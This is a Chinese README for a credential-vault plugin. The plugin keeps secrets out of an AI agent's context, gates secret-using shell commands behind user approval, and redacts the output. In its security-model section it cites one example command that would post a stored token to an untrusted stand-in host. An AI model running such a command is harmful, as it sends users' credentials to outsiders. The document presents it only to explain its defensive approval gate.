# 密钥保险库（Credential Vault）

把密钥保存在本地加密文件中，由单一主密码保护；执行 shell 命令时自动注入密钥——
而密钥值和主密码全程不进入 agent 的对话上下文，也不写入会话日志。

[English](README.md) | 中文

## 为什么需要

agent 使用凭证（Git 托管令牌、API key 等）时，通常会在工具参数或命令输出里看到它，
于是密钥就被写进了会话日志和模型上下文。本插件把整个密钥生命周期挪出对话：

- 密钥值由**用户在弹窗中亲手输入**，从不作为工具参数传递。
- 每个用到密钥的命令在执行前**展示给用户审批**——命令中以 `{{占位符}}` 代替真实值。
- **输出自动脱敏**：用到的密钥值在输出中出现的位置一律替换为 `***` 再返回给 agent。
- 主密码只在浏览器页面与 Host 进程之间的本地 HTTP 通道上传输，不落盘、不进日志。

## 工具

| 工具 | 参数 | 弹窗 | 说明 |
|---|---|---|---|
| `vault_save` | `name`、`note?` | 有 | 新增或更新条目。用户在弹窗中输入主密码（首次使用则设置）和密钥值。库中已有条目时，主密码会与现有条目校验一致——整个保险库共用一个主密码。 |
| `vault_list` | 无 | 无 | 列出条目名、备注和时间戳，绝不返回密钥值。 |
| `vault_use` | `command`、`entries` | 有 | 执行含 `{{条目名}}` 占位符的 shell 命令。弹窗展示完整命令供审计；用户输入主密码批准后，插件在内存中解密、替换全部占位符、执行命令，返回退出码和脱敏后的输出。 |
| `vault_delete` | `name` | 无 | 删除条目。 |
| `vault_change_password` | 无 | 有 | 打开修改窗口（旧密码、新密码、确认）。成功后所有条目用新随机 salt 重新加密。工具永远返回同一句中性文案——agent 既不知道改没改，也接触不到新密码。 |

## 安全模型

- **加密**：主密码经 scrypt（N=16384，r=8，p=1）派生 256 位密钥；每个密钥值单独用
  AES-256-GCM 加密。GCM 认证标签同时充当密码校验——密码错误即解密失败。
- **布局**：条目名、备注、时间戳保持明文（所以 `vault_list`、`vault_delete` 无需密码），
  只有值是密文。
- **文件**：默认 `~/.dsh/vault.json`，权限 `0600`，临时文件 + 原子 rename 写入；
  进程内读写串行化。
- **仅内存**：解密后的值只在单次工具调用期间存在于进程内存，没有任何磁盘缓存；
  默认每次 save/use/change 都重新询问主密码。
- **审批闸门**：弹窗就是人的决策点。像 `curl -d {{token}} https://untrusted.example`
  这样的命令，会以占位符形式先给你过目，你输入密码才放行。
- **通道**：弹窗通过 Harness 页面同源的本机 `/vault-api` HTTP 路由与 Host 通信；
  携带外部 `Origin` 头的请求一律拒绝。

### 已知限制

- 执行时替换后的命令交给 shell，多用户主机上密钥会短暂出现在进程命令行（`ps`）里。
- 脱敏只覆盖输出中与密钥值完全一致的出现；被变换过的输出（哈希、截断回显）无法脱敏。
- 没有浏览器页面连接、或弹窗超时无应答时，工具调用返回明确错误——不保存、不执行。
- 加密文件保护的是静态存储；能读取调用期间 Host 进程内存的人位于信任边界之内。

## 配置

patch 行的可选 `config` 对象：

| 字段 | 默认 | 含义 |
|---|---|---|
| `path` | `~/.dsh/vault.json`（`$DSH_HOME/vault.json`） | 保险库文件位置。 |
| `redactOutput` | `true` | 把输出中出现的密钥值替换为 `***`。 |
| `commandTimeoutMs` | `120000` | 命令超时即终止。 |
| `promptTimeoutMs` | `1800000` | 弹窗超时无应答则调用失败（30 分钟）。 |

```yaml
- insert:
    - id: vault-manager
      name: '@dreagonmon/vault-manager'
      config:
        redactOutput: true
```

## 安装

从 npm 安装：用插件管理器 `install_bundle` 指定 `@dreagonmon/vault-manager`；本地开发则直接指向包目录；或在能解析该包的 profile 里加入上面的 patch 行。bundle 自带两半：Host 插件（`index.js`）与 Web 弹窗
（`client.js`，渲染在 `shell.overlay` 槽位）。无第三方运行时依赖。

## 使用示例

```text
agent: vault_save { name: "github-token", note: "HTTPS git 操作用的 PAT" }
user:  [弹窗] 主密码 + 密钥值

agent: vault_use {
  command: "git push https://{{github-token}}@github.com/me/repo.git main",
  entries: ["github-token"]
}
user:  [弹窗] 过目命令，输入主密码
agent: { exitCode: 0, stdout: "...", stderr: "..." }   # 已脱敏
```

## 隐私契约

agent 能观察到的一切：条目名、备注、时间戳、退出码、以及密钥出现处已剔除的输出。
agent 通过本插件永远观察不到的一切：密钥值、主密码、以及修改主密码的结果。
